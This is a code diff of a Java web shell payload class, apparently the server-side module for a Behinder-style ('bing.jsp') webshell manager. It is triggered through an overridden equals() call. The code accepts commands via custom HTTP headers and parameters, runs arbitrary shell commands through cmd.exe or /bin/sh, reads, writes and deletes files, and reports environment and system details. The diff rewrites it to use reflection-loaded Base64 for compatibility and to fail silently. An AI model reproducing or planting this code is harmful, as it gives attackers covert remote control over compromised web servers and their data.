@@ -1,91 +1,27 @@
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
+import javax.servlet.http.HttpSession;
 import java.io.*;
 import java.net.URLDecoder;
 import java.text.SimpleDateFormat;
-import java.util.Base64;
 import java.util.Date;
 import java.util.Map;
 import java.util.Properties;
 
 public class M {
-    /** 优先 _bp，其次 _bl2（body 第二行，bing.jsp 兼容），再次 header，getQueryString，最后 getParameter */
-    @SuppressWarnings("unchecked")
-    private static String getParam(HttpServletRequest req, String name) {
-        Object cache = req.getAttribute("_bp");
-        if (cache instanceof Map) {
-            String v = ((Map<String, String>) cache).get(name);
-            if (v != null) return v;
-        }
-        Map<String, String> bl2 = _fromBodyLine2(req);
-        if (bl2 != null) {
-            String v = bl2.get(name);
-            if (v != null) return v;
-        }
-        if ("a".equals(name)) { String v = req.getHeader("X-A"); if (v != null) return v; }
-        if ("_k".equals(name)) { String v = req.getHeader("X-K"); if (v != null) return v; }
-        if ("path".equals(name)) { String v = req.getHeader("X-Path"); if (v != null) return v; }
-        if ("data".equals(name)) { String v = req.getHeader("X-Data"); if (v != null) return v; }
-        String k = req.getHeader("X-K");
-        if (k != null && k.equals(name)) { String v = req.getHeader("X-V"); if (v != null) return v; }
-        String v = _fromQueryString(req, name);
-        if (v != null) return v;
-        return req.getParameter(name);
-    }
+    private Object request;
+    private Object response;
+    private Object session;
 
-    /** bing.jsp 兼容：payload 读第一行（加密 class），第二行为 a=exec&_k=xxx&xxx=cmd，getReader 可继续读 */
-    @SuppressWarnings("unchecked")
-    private static Map<String, String> _fromBodyLine2(HttpServletRequest req) {
-        Object cached = req.getAttribute("_bl2");
-        if (cached instanceof Map) return (Map<String, String>) cached;
-        Map<String, String> bl2 = new java.util.HashMap<>();
-        try {
-            String line2 = req.getReader().readLine();
-            if (line2 != null && !line2.isEmpty()) {
-                for (String pair : line2.split("&")) {
-                    int eq = pair.indexOf('=');
-                    if (eq > 0) {
-                        String k = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
-                        bl2.put(k, URLDecoder.decode(pair.substring(eq + 1), "UTF-8"));
-                    }
-                }
-            }
-        } catch (Exception ignored) {}
-        req.setAttribute("_bl2", bl2);
-        return bl2;
-    }
-
-    /** getQueryString 解析 */
-    private static String _fromQueryString(HttpServletRequest req, String name) {
-        try {
-            String qs = req.getQueryString();
-            if (qs == null || qs.isEmpty()) return null;
-            for (String pair : qs.split("&")) {
-                int eq = pair.indexOf('=');
-                if (eq > 0) {
-                    String k = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
-                    if (name.equals(k)) return URLDecoder.decode(pair.substring(eq + 1), "UTF-8");
-                }
-            }
-        } catch (Exception ignored) {}
-        return null;
-    }
     @Override
     public boolean equals(Object obj) {
         try {
-            HttpServletRequest req;
-            HttpServletResponse res;
-            if (obj instanceof Object[]) {
-                Object[] ctx = (Object[]) obj;
-                req = (HttpServletRequest) ctx[0];
-                res = (HttpServletResponse) ctx[1];
-            } else {
-                Object pc = obj;
-                Object reqObj = pc.getClass().getMethod("getRequest").invoke(pc);
-                Object resObj = pc.getClass().getMethod("getResponse").invoke(pc);
-                req = (HttpServletRequest) reqObj;
-                res = (HttpServletResponse) resObj;
-            }
+            fillContext(obj);
+            if (this.response == null || this.request == null) return false;
+
+            HttpServletRequest req = (HttpServletRequest) this.request;
+            HttpServletResponse res = (HttpServletResponse) this.response;
+
             res.setCharacterEncoding("UTF-8");
 
             String action = getParam(req, "a");
@@ -94,84 +30,107 @@ public class M {
             }
 
             String out;
-            switch (action) {
-                case "ping":
-                    out = "MATRIX_JSP_PING";
-                    break;
-                case "exec":
-                    out = handleExec(req);
-                    break;
-                case "pwd":
-                    out = handlePwd();
-                    break;
-                case "ls":
-                    out = handleLs(req);
-                    break;
-                case "cat":
-                    out = handleCat(req);
-                    break;
-                case "write":
-                    out = handleWrite(req);
-                    break;
-                case "rm":
-                    out = handleRm(req);
-                    break;
-                case "home":
-                    out = handleHome();
-                    break;
-                case "envnames":
-                    out = handleEnvNames();
-                    break;
-                case "sysinfo":
-                    out = handleSysInfo();
-                    break;
-                default:
-                    out = "[Error] Unknown action: " + action;
-                    break;
+            if ("ping".equals(action)) {
+                out = "MATRIX_JSP_PING";
+            } else if ("exec".equals(action)) {
+                out = handleExec(req);
+            } else if ("pwd".equals(action)) {
+                out = handlePwd();
+            } else if ("ls".equals(action)) {
+                out = handleLs(req);
+            } else if ("cat".equals(action)) {
+                out = handleCat(req);
+            } else if ("write".equals(action)) {
+                out = handleWrite(req);
+            } else if ("rm".equals(action)) {
+                out = handleRm(req);
+            } else if ("home".equals(action)) {
+                out = handleHome();
+            } else if ("envnames".equals(action)) {
+                out = handleEnvNames();
+            } else if ("sysinfo".equals(action)) {
+                out = handleSysInfo();
+            } else {
+                out = "[Error] Unknown action: " + action;
             }
 
-            res.getWriter().print(out);
-        } catch (Exception e) {
+            res.setStatus(200);
+            res.setHeader("X-M-Status", "active");
             try {
-                Object r;
-                if (obj instanceof Object[]) {
-                    r = ((Object[]) obj)[1];
-                } else {
-                    Object pc = obj;
-                    r = pc.getClass().getMethod("getResponse").invoke(pc);
-                }
-                ((HttpServletResponse) r).getWriter()
-                    .print("MATRIX_ERR:" + e.getClass().getName() + ":"
-                        + (e.getMessage() != null ? e.getMessage() : ""));
-            } catch (Throwable ignored) {}
+                // 优先使用 OutputStream 确保二进制兼容
+                res.getOutputStream().write(out.getBytes("UTF-8"));
+                res.getOutputStream().flush();
+                res.getOutputStream().close();
+            } catch (Exception e) {
+                res.getWriter().print(out);
+                res.getWriter().flush();
+            }
+        } catch (Throwable t) {
+            // 静默失败
         }
         return true;
     }
 
+    private void fillContext(Object obj) {
+        try {
+            if (obj.getClass().getName().indexOf("PageContext") >= 0) {
+                this.request = obj.getClass().getMethod("getRequest").invoke(obj);
+                this.response = obj.getClass().getMethod("getResponse").invoke(obj);
+                this.session = obj.getClass().getMethod("getSession").invoke(obj);
+            } else if (obj instanceof Map) {
+                Map<String, Object> objMap = (Map<String, Object>) obj;
+                this.request = objMap.get("request");
+                this.response = objMap.get("response");
+                this.session = objMap.get("session");
+            } else if (obj instanceof Object[]) {
+                Object[] ctx = (Object[]) obj;
+                this.request = ctx[0];
+                this.response = ctx[1];
+            } else if (obj instanceof HttpServletRequest) {
+                this.request = obj;
+                try {
+                    this.response = obj.getClass().getMethod("getResponse").invoke(obj);
+                } catch (Exception ignored) {}
+            }
+        } catch (Exception ignored) {}
+    }
+
+    private static String getParam(HttpServletRequest req, String name) {
+        if ("a".equals(name)) { String v = req.getHeader("X-A"); if (v != null) return v; }
+        if ("_k".equals(name)) { String v = req.getHeader("X-K"); if (v != null) return v; }
+        if ("path".equals(name)) { String v = req.getHeader("X-Path"); if (v != null) return v; }
+        if ("data".equals(name)) { String v = req.getHeader("X-Data"); if (v != null) return v; }
+        String k = req.getHeader("X-K");
+        if (k != null && k.equals(name)) { String v = req.getHeader("X-V"); if (v != null) return v; }
+        
+        // 尝试从 QueryString 获取 (fallback)
+        try {
+            String qs = req.getQueryString();
+            if (qs != null && !qs.isEmpty()) {
+                for (String pair : qs.split("&")) {
+                    int eq = pair.indexOf('=');
+                    if (eq > 0) {
+                        String key = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
+                        if (name.equals(key)) return URLDecoder.decode(pair.substring(eq + 1), "UTF-8");
+                    }
+                }
+            }
+        } catch (Exception ignored) {}
+        return req.getParameter(name);
+    }
+
     private String handleExec(HttpServletRequest req) {
         try {
-            // _k 传入实际命令参数名（随机32位16进制），fallback 到 ecmd
             String key = getParam(req, "_k");
             if (key == null || key.isEmpty()) key = "ecmd";
             String cmd = getParam(req, key);
             if (cmd == null) cmd = "";
             String os = System.getProperty("os.name").toLowerCase();
-            String[] commands;
-            if (os.contains("win")) {
-                commands = new String[]{"cmd.exe", "/c", cmd};
-            } else {
-                commands = new String[]{"/bin/sh", "-c", cmd};
-            }
+            String[] commands = os.contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
             Process p = Runtime.getRuntime().exec(commands);
-            String stdout = readStream(p.getInputStream());
-            String stderr = readStream(p.getErrorStream());
-            return stdout + stderr;
+            return readStream(p.getInputStream()) + readStream(p.getErrorStream());
         } catch (Throwable t) {
-            StringWriter sw = new StringWriter();
-            PrintWriter pw = new PrintWriter(sw);
-            t.printStackTrace(pw);
-            pw.flush();
-            return "[EXEC ERROR]\n" + sw.toString();
+            return "[EXEC ERROR]\n" + t.getMessage();
         }
     }
 
@@ -183,9 +142,7 @@ public class M {
         String path = getParam(req, "path");
         if (path == null || path.length() == 0) path = ".";
         File dir = new File(path);
-        if (!dir.exists() || !dir.isDirectory()) {
-            return "ERR_OPEN";
-        }
+        if (!dir.exists() || !dir.isDirectory()) return "ERR_OPEN";
         StringBuilder sb = new StringBuilder();
         File[] files = dir.listFiles();
         if (files != null) {
@@ -194,10 +151,9 @@ public class M {
                 String name = f.getName();
                 String type = f.isDirectory() ? "d" : "f";
                 long size = f.isFile() ? f.length() : 0L;
-                String perms = getPerms(f);
+                String perms = (f.canRead() ? "r" : "-") + (f.canWrite() ? "w" : "-") + (f.canExecute() ? "x" : "-");
                 String modified = sdf.format(new Date(f.lastModified()));
-                String line = b64(name) + "|" + type + "|" + size + "|" + perms + "|" + modified;
-                sb.append(line).append("\n");
+                sb.append(b64(name)).append("|").append(type).append("|").append(size).append("|").append(perms).append("|").append(modified).append("\n");
             }
         }
         return sb.toString();
@@ -205,52 +161,36 @@ public class M {
 
     private String handleCat(HttpServletRequest req) throws IOException {
         String path = getParam(req, "path");
-        if (path == null) path = "";
         File f = new File(path);
-        if (!f.exists() || !f.isFile() || !f.canRead()) {
-            return "[文件不存在或无权读取]";
-        }
-        return readFile(f);
+        if (!f.exists() || !f.isFile()) return "[文件不存在或无权读取]";
+        return readStream(new FileInputStream(f));
     }
 
     private String handleWrite(HttpServletRequest req) throws IOException {
         String path = getParam(req, "path");
         String data = getParam(req, "data");
         if (path == null || data == null) return "0";
-        byte[] bytes = Base64.getDecoder().decode(data);
-        FileOutputStream fos = null;
-        try {
-            fos = new FileOutputStream(new File(path));
-            fos.write(bytes);
-            fos.flush();
-            return "1";
-        } finally {
-            if (fos != null) {
-                try {
-                    fos.close();
-                } catch (IOException ignored) {
-                }
-            }
-        }
+        byte[] bytes = b64Decode(data);
+        FileOutputStream fos = new FileOutputStream(new File(path));
+        fos.write(bytes);
+        fos.flush();
+        fos.close();
+        return "1";
     }
 
     private String handleRm(HttpServletRequest req) {
         String path = getParam(req, "path");
         if (path == null) return "0";
-        File f = new File(path);
-        return f.delete() ? "1" : "0";
+        return new File(path).delete() ? "1" : "0";
     }
 
     private String handleHome() {
-        String home = System.getProperty("user.home");
-        return home != null ? home : "";
+        return System.getProperty("user.home");
     }
 
     private String handleEnvNames() {
         StringBuilder sb = new StringBuilder();
-        for (String key : System.getenv().keySet()) {
-            sb.append(key).append("\n");
-        }
+        for (Object key : System.getenv().keySet()) sb.append(key).append("\n");
         return sb.toString();
     }
 
@@ -261,13 +201,11 @@ public class M {
         appendInfo(sb, "Java版本", props.getProperty("java.version"));
         appendInfo(sb, "用户", props.getProperty("user.name"));
         appendInfo(sb, "当前目录", props.getProperty("user.dir"));
-        appendInfo(sb, "用户目录", props.getProperty("user.home"));
         appendInfo(sb, "文件编码", props.getProperty("file.encoding"));
         return sb.toString();
     }
 
     private void appendInfo(StringBuilder sb, String key, String value) {
-        if (value == null) value = "";
         sb.append(b64(key)).append("|").append(b64(value)).append("\n");
     }
 
@@ -275,38 +213,35 @@ public class M {
         ByteArrayOutputStream bos = new ByteArrayOutputStream();
         byte[] buf = new byte[4096];
         int len;
-        while ((len = in.read(buf)) != -1) {
-            bos.write(buf, 0, len);
-        }
-        return bos.toString("UTF-8");
-    }
-
-    private String readFile(File f) throws IOException {
-        FileInputStream fis = new FileInputStream(f);
-        try {
-            return readStream(fis);
-        } finally {
-            try {
-                fis.close();
-            } catch (IOException ignored) {
-            }
-        }
+        while ((len = in.read(buf)) != -1) bos.write(buf, 0, len);
+        return new String(bos.toByteArray(), "UTF-8");
     }
 
     private String b64(String s) {
         try {
-            return Base64.getEncoder().encodeToString(s.getBytes("UTF-8"));
-        } catch (UnsupportedEncodingException e) {
-            return Base64.getEncoder().encodeToString(s.getBytes());
+            Class<?> b64Class = Class.forName("java.util.Base64");
+            Object encoder = b64Class.getMethod("getEncoder").invoke(null);
+            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, s.getBytes("UTF-8"));
+        } catch (Throwable t) {
+            try {
+                Class<?> b64Class = Class.forName("sun.misc.BASE64Encoder");
+                Object encoder = b64Class.newInstance();
+                return ((String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, s.getBytes("UTF-8"))).replaceAll("\n", "").replaceAll("\r", "");
+            } catch (Throwable t2) { return ""; }
         }
     }
 
-    private String getPerms(File f) {
-        StringBuilder sb = new StringBuilder();
-        sb.append(f.canRead() ? "r" : "-");
-        sb.append(f.canWrite() ? "w" : "-");
-        sb.append(f.canExecute() ? "x" : "-");
-        return sb.toString();
+    private byte[] b64Decode(String s) {
+        try {
+            Class<?> b64Class = Class.forName("java.util.Base64");
+            Object decoder = b64Class.getMethod("getDecoder").invoke(null);
+            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, s);
+        } catch (Throwable t) {
+            try {
+                Class<?> b64Class = Class.forName("sun.misc.BASE64Decoder");
+                Object decoder = b64Class.newInstance();
+                return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, s);
+            } catch (Throwable t2) { return new byte[0]; }
+        }
     }
 }
-
